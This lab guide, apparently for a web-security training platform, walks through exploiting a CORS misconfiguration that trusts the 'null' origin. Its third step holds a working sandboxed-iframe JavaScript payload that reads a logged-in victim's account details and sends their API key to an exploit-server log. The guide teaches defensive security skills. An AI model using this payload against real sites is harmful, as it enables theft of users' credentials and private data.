# 🛡️ Lab Guide: CORS Vulnerability with Trusted Null Origin

This guide walks you through exploiting a **CORS vulnerability** where the server trusts the `null` origin, allowing unauthorized access to sensitive data like API keys. Using **Burp Suite**, you’ll craft an exploit to retrieve a victim’s API key. Let’s dive in! 🚀

---

## 📋 Objective
Exploit a CORS misconfiguration that trusts the `null` origin to retrieve the victim’s API key via a malicious script.

---

## 🛠️ Tools Needed
- **Burp Suite** (with Burp’s browser)
- **Repeater** module in Burp Suite
- **Exploit Server** (provided in the lab environment)
- Basic understanding of CORS and JavaScript payloads

---

## 📝 Step-by-Step Instructions

### 1️⃣ Log In and Capture the Request
- Ensure **Intercept** is off in Burp Suite.
- Use **Burp’s browser** to log in to your account and click **My Account**.
- In **Proxy > HTTP history**, locate the AJAX request to `/accountDetails`.
- Observe the **Access-Control-Allow-Credentials: true** header, suggesting CORS support.
- **Right-click** the request and select **Send to Repeater**.

### 2️⃣ Test for Null Origin Reflection
- In **Repeater**, add the header:
  ```
  Origin: null
  ```
- Resubmit the request and check the response.
- **Observation**: The response includes `Access-Control-Allow-Origin: null`, confirming the server trusts the `null` origin.

### 3️⃣ Craft the Exploit
- Navigate to the **Exploit Server** in the browser.
- Enter the following HTML, replacing `YOUR-LAB-ID` and `YOUR-EXPLOIT-SERVER-ID` with your lab-specific URLs:
  ```html
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a3100d404db72be80780356008700cc.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
      location='https://exploit-0a2e0056049e7273804f02c401bc0026.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
  </script>"></iframe> 
  ```
- **Note**: The sandboxed `iframe` generates a `null` origin request, bypassing CORS restrictions.

### 4️⃣ Test and Deliver the Exploit
- Click **View exploit** to verify the exploit works. You should land on the log page with the API key in the URL.
- Go back to the **Exploit Server** and click **Deliver exploit to victim**.
- Access the **Access log**, retrieve the victim’s API key, and submit it to complete the lab.